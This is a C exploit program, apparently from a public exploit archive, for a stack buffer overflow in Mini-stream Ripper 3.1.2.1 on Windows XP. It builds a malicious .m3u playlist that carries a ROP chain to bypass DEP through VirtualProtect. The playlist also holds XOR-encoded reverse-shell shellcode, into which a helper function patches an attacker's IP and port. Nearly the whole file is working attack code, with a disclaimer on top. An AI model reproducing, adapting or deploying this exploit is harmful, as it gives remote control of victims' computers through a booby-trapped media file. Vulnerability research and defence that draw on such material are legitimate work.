/*
   DISCLAIMER
    
   THIS PROGRAM IS NOT INTENDED TO BE USED ON OTHER COMPUTERS AND IT IS DESTINED FOR PERSONAL RESEARCH ONLY!!!!
   The programs are provided as is without any guarantees or warranty.
   The author is not responsible for any damage or losses of any kind caused by the use or misuse of the programs.
   The author is under no obligation to provide support, service, corrections, or upgrades to the free software programs.
    
   Author:                fl0 fl0w
   Software:              Mini-stream Ripper? 
   Dl link:               http://www.mini-stream.net/downloads/Mini-streamRipper.exe
   Test platform:	      Microsoft Windows xp sp3 with full updates 
   Afected Versions:      3.1.2.1.2010.03.30
   Remote:                No
   Local:                 Yes
   Class:                 Boundary Condition Error
   Bug:                   Stack buffer overflow
   Exploitable:           Yes 
   Method of exploitation:Ret to libc  
   Afected software:      Windows 98/Me/2000/XP  
   Fix:                   No fix   
   Compiler:              gcc version 3.4.4 (cygming special, gdc 0.12, using dmd 0.125) 
   Video:                 http://www.youtube.com/watch?v=Prf-YCVrSfc    
   The .C code:
 */
 
 
#include<stdio.h>

#define HEAD  "\x23\x45\x58\x54\x4D\x33\x55\x0D\x0A"
#define URL   "\x68\x74\x74\x70\x3A\x2F\x2F"
#define CHARS "0123456789ABCDEFGHIJKLMNOPQRST" \
              "UVWXYZabcdefghijklmnopqrstuvwxyz"
#define VIDEO "\t-www.youtube.com/watch?v=Prf-YCVrSfc"						 
#define VER   "3.1.2.1.2010.03.30"			  
#define TITLE "  Mini-stream Ripper "VER" local buffer overflow(DEP bypass)\n" \
              "\t-by fl0 fl0w\n "VIDEO" " 
	unsigned char reverse_sc[] =
	         {
                    "\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA"
                    "\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9"
                    "\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3"
                    "\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE"
                    "\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99"
                    "\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF"
                    "\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6"
                    "\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF"
                    "\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD"
                    "\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD"
                    "\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD"
                    "\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66"
                    "\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66"
                    "\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB"
                    "\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3"
                    "\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3"
                    "\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D"
                    "\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75"
                    "\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2"
                    "\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0"
             } ;
    /* rop assembly
     _start:
	 
     grab_stack_pointer:
          retn
	 
	 save_stack_pointer:
          push esp        	 
	      mov eax,edx
          pop edi
          retn			 
          pop eax
          retn
          add esp,2c
          retn		  
     
     push_VirtualProtect:
          mov edi,edi
          push ebp
          mov ebp,esp
          push dword ptr ss:[ebp+14]
          push dword ptr ss:[ebp+10]
          push dword ptr ss:[ebp+c]
          push dword ptr ss:[ebp+8]
          push -1
          call kernel32.VirtualProtectEx
          pop ebp
          retn 10
		
     lpAddress:
          xchg esi,edi
		  dec ecx
          retn 4
          add eax,100
          pop ebp
          retn 		  
		  mov dword ptr ds:[esi+10],eax
		  mov eax,esi
		  pop esi
          retn
     
	 dwSize:     
	      push eax
		  pop esi
		  retn
		  add eax,100
		  pop ebp
		  retn
		  inc esi
		  retn
		  inc esi
		  retn
		  inc esi
		  retn
		  inc esi
		  retn
		  mov dword ptr ds:[esi+10],eax
		  mov eax,esi
		  pop esi
          retn
		  
	 flNewProtect:
          push eax
		  pop esi
		  retn
		  xor eax,eax
          retn
          add eax,100
          pop ebp
          retn
   		  add eax,100
          pop ebp
          retn
		  add eax,100
          pop ebp
          retn
		  inc esi
		  retn
		  inc esi
		  retn
		  inc esi
		  retn
		  inc esi
		  retn
		  mov dword ptr ds:[esi+10],eax
		  mov eax,esi
		  pop esi
          retn
	  	
	  lpflOldProtect:
          push eax
		  pop esi
		  retn
          xor eax,eax
          retn
          add eax,40
          retn
		  inc esi
		  retn
		  inc esi
		  retn
		  inc esi
		  retn
		  inc esi
		  retn
		  mov dword ptr ds:[esi+10],eax
		  mov eax,esi
		  pop esi
          retn
          sub eax,4
	      retn
 		  sub eax,4
	      retn
		  push eax
		  pop esp
		  mov eax,edi
		  pop edi
		  pop esi
		  retn 
  */			 
  int eip_offset=17417;
  int nop_offset=17453;
  int shell_offset=17473;
 
  char RET[]="\x5e\x16\x80\x7c"; 
  char instr1[]="\x77\x92\xd7\x5a"; 
  char instr2[]="\x42\xe8\xc1\x77"; 
  char instr3[]="\x01\xd8\xc4\x77"; 
  char instr4[]="\x2b\xec\xc4\x77"; 
  char instr5[]="\x2f\x98\x3c\x76"; 
  char instr6[]="\x15\x41\xe8\x77"; 
  char instr7[]="\x4a\x14\x5d\x77"; 
  char instr8[]="\x1d\x7d\x15\x77"; 
  char instr9[]="\x9e\x66\xd7\x5a";    
  char instr10[]="\xbf\x8b\xca\x76"; 
  char instr11[]="\x1d\x14\x5d\x77";
  char instr12[]="\xa8\x5c\xdf\x73";  
  
  char virtualprotect[]="\xD4\x1A\x80\x7C";//kernel32.dll
  char retaddr[]="\x41\x41\x44\x44";
  char lpaddr[]="\x45\x45\x45\x45";
  char sz[]="\x46\x46\x46\x46";
  char flnprot[]="\x47\x47\x47\x47";  
  
int make_reverseshell(char *, char *);
void error_handle(void);
void copy_str(char*,char*,int);
void gen_random (char*, const int);
void file();


    int main()
   {  printf("%s",TITLE);
      file();
      return 0;
   }
  void file()
    { FILE* f=fopen("exploit.m3u","wb");
      unsigned char buf[100001];
	   
    if(!f) 
	  error_handle();
	make_reverseshell("127.0.0.1","2010");//change here with what you want...
	gen_random(buf,26117);  
	
	memcpy(buf+eip_offset,RET,4);
	memcpy(buf+eip_offset+4,"aaaa",4);
	memcpy(buf+eip_offset+8,instr1,4);
	memcpy(buf+eip_offset+12,instr2,4);
	memcpy(buf+eip_offset+16,"bbbb",4);
	memcpy(buf+eip_offset+20,instr3,4);
	memcpy(buf+eip_offset+24,virtualprotect,4);
	memcpy(buf+eip_offset+28,retaddr,4);
	memcpy(buf+eip_offset+32,lpaddr,4);
	memcpy(buf+eip_offset+36,sz,4);
	memcpy(buf+eip_offset+40,flnprot,4);
	
	memset(buf+eip_offset+44,0x90,300);
	memcpy(buf+eip_offset+68,instr5,4);
	memcpy(buf+eip_offset+72,instr4,4);
	memcpy(buf+eip_offset+84,instr6,4);
	memcpy(buf+eip_offset+92,instr7,4);
	memcpy(buf+eip_offset+96,instr4,4);
	
    memcpy(buf+eip_offset+104,instr8,4);	
	memcpy(buf+eip_offset+108,instr8,4);
	memcpy(buf+eip_offset+112,instr8,4);
	memcpy(buf+eip_offset+116,instr8,4);
	
	memcpy(buf+eip_offset+120,instr6,4);
	memcpy(buf+eip_offset+128,instr7,4);
	memcpy(buf+eip_offset+132,instr9,4);
	
	memcpy(buf+eip_offset+136,instr4,4);
	memcpy(buf+eip_offset+144,instr4,4);
	memcpy(buf+eip_offset+152,instr4,4);
	
	memcpy(buf+eip_offset+160,instr8,4);	
	memcpy(buf+eip_offset+164,instr8,4);
	memcpy(buf+eip_offset+168,instr8,4);
	memcpy(buf+eip_offset+172,instr8,4);
	
	memcpy(buf+eip_offset+176,instr6,4);
	memcpy(buf+eip_offset+184,instr7,4);
	memcpy(buf+eip_offset+188,instr9,4);
	
	memcpy(buf+eip_offset+192,instr10,4);
	
	memcpy(buf+eip_offset+196,instr8,4);	
	memcpy(buf+eip_offset+200,instr8,4);
	memcpy(buf+eip_offset+204,instr8,4);
	memcpy(buf+eip_offset+208,instr8,4);
	
	memcpy(buf+eip_offset+212,instr6,4);
	memcpy(buf+eip_offset+220,instr11,4);
	memcpy(buf+eip_offset+224,instr11,4);
	memcpy(buf+eip_offset+228,instr12,4);
	
	memcpy(buf+eip_offset+344,reverse_sc,strlen(reverse_sc));//change here shellcode
	
	fwrite(HEAD,sizeof(char),strlen(HEAD),f);
	fwrite(URL,sizeof(char),strlen(URL),f);
	fwrite(buf,sizeof(char),strlen(buf),f);
		
	fclose(f);
    }
     void gen_random (char* s, const int len)
	{  
	    int i;
        for(i=0;i<len;++i){
        s[i]=CHARS[rand()%(sizeof(CHARS)-1)];
        }
       s[len]=0;
    }

	 void error_handle(void)
	{
          perror("\nError");
          exit(1);
    }
	
	 int make_reverseshell(char *ip, char *port) 
	{
        unsigned int xorip;
        unsigned short xorport;
        xorip = inet_addr(ip)^(unsigned int)0x99999999;
        xorport = htons(atoi( port )^(unsigned short)0x9999);
        memcpy ( &reverse_sc[111], &xorip, 4);
        memcpy ( &reverse_sc[118], &xorport, 2);
   }

